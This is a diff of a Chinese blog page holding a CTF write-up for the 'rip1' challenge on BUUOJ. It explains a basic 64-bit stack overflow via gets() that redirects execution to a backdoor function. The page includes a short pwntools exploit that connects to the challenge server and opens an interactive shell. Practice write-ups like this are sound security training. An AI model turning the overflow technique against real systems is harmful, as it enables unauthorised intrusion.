@@ -45,21 +45,21 @@
 
     <!-- OpenGraph -->
  
-    <meta name="description" content="rip1题目描述及其考点题目描述：考点：基本的栈溢出   WP使用checksec查看程序使用对应的ida打开程序，F5查看伪代码发现有溢出漏洞，gets函数，并且留有shell后门记住这个fun函数的地址0x401186查看传值的变量的大小为15字节接下来解题思路便有了，便可直接写脚本了 EXP12345678910from pwn import *io &#x3D; remote(&amp;#x27;node4">
+    <meta name="description" content="rip1题目描述及其考点题目描述：考点：基本的栈溢出   WP使用checksec查看程序使用对应的ida打开程序，F5查看伪代码发现有溢出漏洞，gets函数，查看传值的变量的大小为15字节查看旁边的fun函数，发现是留给我们的shell后门记住这个fun函数的地址0x401186接下来解题思路便有了，便可直接写脚本了 EXP12345678910from pwn import *io &#x3D; rem">
 <meta property="og:type" content="article">
 <meta property="og:title" content="rip1">
 <meta property="og:url" content="http://example.com/2022/11/10/rip1/index.html">
 <meta property="og:site_name" content="Gwoo">
-<meta property="og:description" content="rip1题目描述及其考点题目描述：考点：基本的栈溢出   WP使用checksec查看程序使用对应的ida打开程序，F5查看伪代码发现有溢出漏洞，gets函数，并且留有shell后门记住这个fun函数的地址0x401186查看传值的变量的大小为15字节接下来解题思路便有了，便可直接写脚本了 EXP12345678910from pwn import *io &#x3D; remote(&amp;#x27;node4">
+<meta property="og:description" content="rip1题目描述及其考点题目描述：考点：基本的栈溢出   WP使用checksec查看程序使用对应的ida打开程序，F5查看伪代码发现有溢出漏洞，gets函数，查看传值的变量的大小为15字节查看旁边的fun函数，发现是留给我们的shell后门记住这个fun函数的地址0x401186接下来解题思路便有了，便可直接写脚本了 EXP12345678910from pwn import *io &#x3D; rem">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://user-images.githubusercontent.com/93712124/200984292-8a914714-fbac-47bc-b912-aa5af218cf72.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/93712124/200984305-16f322ab-b5b3-4f04-9384-61c438f5b79e.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/93712124/200984301-52f435f2-e805-40e8-9b09-9a0a856c7a7b.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/93712124/200984299-1269eecb-f2c9-468c-b08b-88560476e68f.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/93712124/200984282-dcff3b9a-ce85-4586-8822-482dbe3e8dd4.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/93712124/200984301-52f435f2-e805-40e8-9b09-9a0a856c7a7b.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/93712124/200984294-3f256309-73fd-4a5b-9cb0-67b91d49d1df.png">
 <meta property="article:published_time" content="2022-11-10T00:51:23.000Z">
-<meta property="article:modified_time" content="2022-11-10T02:30:45.542Z">
+<meta property="article:modified_time" content="2022-11-10T02:36:49.441Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -196,7 +196,7 @@
     <div class="post__header"></div>
     <div class="post__content">
         <h1 id="rip1"><a href="#rip1" class="headerlink" title="rip1"></a>rip1</h1><h3 id="题目描述及其考点"><a href="#题目描述及其考点" class="headerlink" title="题目描述及其考点"></a>题目描述及其考点</h3><p>题目描述：<br>考点：基本的栈溢出  </p>
-<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>使用<strong>checksec</strong>查看程序<br><img src="https://user-images.githubusercontent.com/93712124/200984292-8a914714-fbac-47bc-b912-aa5af218cf72.png" alt="1"><br>使用对应的ida打开程序，F5查看伪代码<br><img src="https://user-images.githubusercontent.com/93712124/200984305-16f322ab-b5b3-4f04-9384-61c438f5b79e.png" alt="2"><br>发现有溢出漏洞，gets函数，并且留有shell后门<br><img src="https://user-images.githubusercontent.com/93712124/200984299-1269eecb-f2c9-468c-b08b-88560476e68f.png" alt="3"><br>记住这个fun函数的地址<strong>0x401186</strong><br><img src="https://user-images.githubusercontent.com/93712124/200984282-dcff3b9a-ce85-4586-8822-482dbe3e8dd4.png" alt="4"><br>查看传值的变量的大小为15字节<br><img src="https://user-images.githubusercontent.com/93712124/200984301-52f435f2-e805-40e8-9b09-9a0a856c7a7b.png" alt="5"><br>接下来解题思路便有了，便可直接写脚本了</p>
+<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>使用<strong>checksec</strong>查看程序<br><img src="https://user-images.githubusercontent.com/93712124/200984292-8a914714-fbac-47bc-b912-aa5af218cf72.png" alt="1"><br>使用对应的ida打开程序，F5查看伪代码<br><img src="https://user-images.githubusercontent.com/93712124/200984305-16f322ab-b5b3-4f04-9384-61c438f5b79e.png" alt="2"><br>发现有溢出漏洞，gets函数，查看传值的变量的大小为15字节<br><img src="https://user-images.githubusercontent.com/93712124/200984301-52f435f2-e805-40e8-9b09-9a0a856c7a7b.png" alt="5"><br>查看旁边的fun函数，发现是留给我们的shell后门<br><img src="https://user-images.githubusercontent.com/93712124/200984299-1269eecb-f2c9-468c-b08b-88560476e68f.png" alt="3"><br>记住这个fun函数的地址<strong>0x401186</strong><br><img src="https://user-images.githubusercontent.com/93712124/200984282-dcff3b9a-ce85-4586-8822-482dbe3e8dd4.png" alt="4"><br>接下来解题思路便有了，便可直接写脚本了</p>
 <h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;, 26867)</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27; * 15  </span><br><span class="line">payload += &#x27;a&#x27; * 8</span><br><span class="line">payload += p64(0x401186 + 1).decode(&quot;iso-8859-1&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><h6 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h6><p>先将变量填满<br>由于程序是64位文件，需要用8个字节来填充ebp（如果是32位则需要4个字节）<br>再将后门函数的地址溢出到<strong>ret</strong>函数，+1是为了维持堆栈平衡(?)  </p>
 <h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>运行脚本，便拿到了shell，便可拿到flag<br><img src="https://user-images.githubusercontent.com/93712124/200984294-3f256309-73fd-4a5b-9cb0-67b91d49d1df.png" alt="6"></p>
